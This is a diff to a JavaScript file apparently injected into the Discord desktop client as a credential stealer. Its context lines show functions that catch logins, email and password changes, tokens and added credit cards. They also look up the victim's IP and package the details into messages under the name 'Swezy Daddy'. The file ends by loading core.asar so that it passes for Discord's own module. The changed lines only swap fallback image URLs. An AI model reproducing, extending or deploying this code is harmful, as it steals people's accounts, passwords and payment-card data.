@@ -295,10 +295,10 @@ async function FirstTime() {
                     } = await getFromURL("https://www.myexternalip.com/json", null)
                     
                     if(b.avatar === null){
-                        usericonurl = "https://media.discordapp.net/attachments/1005549560145379418/1070355938600558712/5O_1di3yc-0yQiCpsQ576w.png"
+                        usericonurl = "https://raw.githubusercontent.com/RndmAcc123/gffrhtgmigreujimtrmjinjniumhc/main/BannerERROR.png"
                     }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                     if(b.banner === null){
-                        bannerurl = "https://media.discordapp.net/attachments/1005549560145379418/1070355938600558712/5O_1di3yc-0yQiCpsQ576w.png"
+                        bannerurl = "https://raw.githubusercontent.com/RndmAcc123/gffrhtgmigreujimtrmjinjniumhc/main/BannerERROR.png"
                     }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                     const c = {
                         username: "Swezy Daddy",
@@ -410,10 +410,10 @@ async function FirstTime() {
                                 ip
                             } = await getFromURL("https://www.myexternalip.com/json", null)
                             if(b.avatar === null){
-                                usericonurl = "https://media.discordapp.net/attachments/1005549560145379418/1070355938600558712/5O_1di3yc-0yQiCpsQ576w.png"
+                                usericonurl = "https://raw.githubusercontent.com/RndmAcc123/gffrhtgmigreujimtrmjinjniumhc/main/BannerERROR.png"
                             }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                             if(b.banner === null){
-                                bannerurl = "https://media.discordapp.net/attachments/1005549560145379418/1070355938600558712/5O_1di3yc-0yQiCpsQ576w.png"
+                                bannerurl = "https://raw.githubusercontent.com/RndmAcc123/gffrhtgmigreujimtrmjinjniumhc/main/BannerERROR.png"
                             }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                             const c = {
                                 username: "Swezy Daddy",
@@ -830,10 +830,10 @@ async function Login(email, password, token) {
                 return billing
             }
             if(info.avatar === null){
-                usericonurl = "https://media.discordapp.net/attachments/1005549560145379418/1070355938600558712/5O_1di3yc-0yQiCpsQ576w.png"
+                usericonurl = "https://raw.githubusercontent.com/RndmAcc123/gffrhtgmigreujimtrmjinjniumhc/main/BannerERROR.png"
             }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
             if(info.banner === null){
-                bannerurl = "https://media.discordapp.net/attachments/1005549560145379418/1070355938600558712/5O_1di3yc-0yQiCpsQ576w.png"
+                bannerurl = "https://raw.githubusercontent.com/RndmAcc123/gffrhtgmigreujimtrmjinjniumhc/main/BannerERROR.png"
             }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
             
             const params = {
@@ -1158,10 +1158,10 @@ async function ChangeEmail(newemail, password, token) {
                 return billing
             }
             if(info.avatar === null){
-                usericonurl = "https://media.discordapp.net/attachments/1005549560145379418/1070355938600558712/5O_1di3yc-0yQiCpsQ576w.png"
+                usericonurl = "https://raw.githubusercontent.com/RndmAcc123/gffrhtgmigreujimtrmjinjniumhc/main/BannerERROR.png"
             }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
             if(info.banner === null){
-                bannerurl = "https://media.discordapp.net/attachments/1005549560145379418/1070355938600558712/5O_1di3yc-0yQiCpsQ576w.png"
+                bannerurl = "https://raw.githubusercontent.com/RndmAcc123/gffrhtgmigreujimtrmjinjniumhc/main/BannerERROR.png"
             }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
 
 
@@ -1270,10 +1270,10 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         ip
     } = await getFromURL("https://www.myexternalip.com/json", null)
         if(info.avatar === null){
-            usericonurl = "https://media.discordapp.net/attachments/1005549560145379418/1070355938600558712/5O_1di3yc-0yQiCpsQ576w.png"
+            usericonurl = "https://raw.githubusercontent.com/RndmAcc123/gffrhtgmigreujimtrmjinjniumhc/main/BannerERROR.png"
         }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
         if(info.banner === null){
-            bannerurl = "https://media.discordapp.net/attachments/1005549560145379418/1070355938600558712/5O_1di3yc-0yQiCpsQ576w.png"
+            bannerurl = "https://raw.githubusercontent.com/RndmAcc123/gffrhtgmigreujimtrmjinjniumhc/main/BannerERROR.png"
         }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
 
         
@@ -1389,9 +1389,5 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
         })).catch(console.error);
     }
 });
-
-
-
-
 
 module.exports = require('./core.asar')
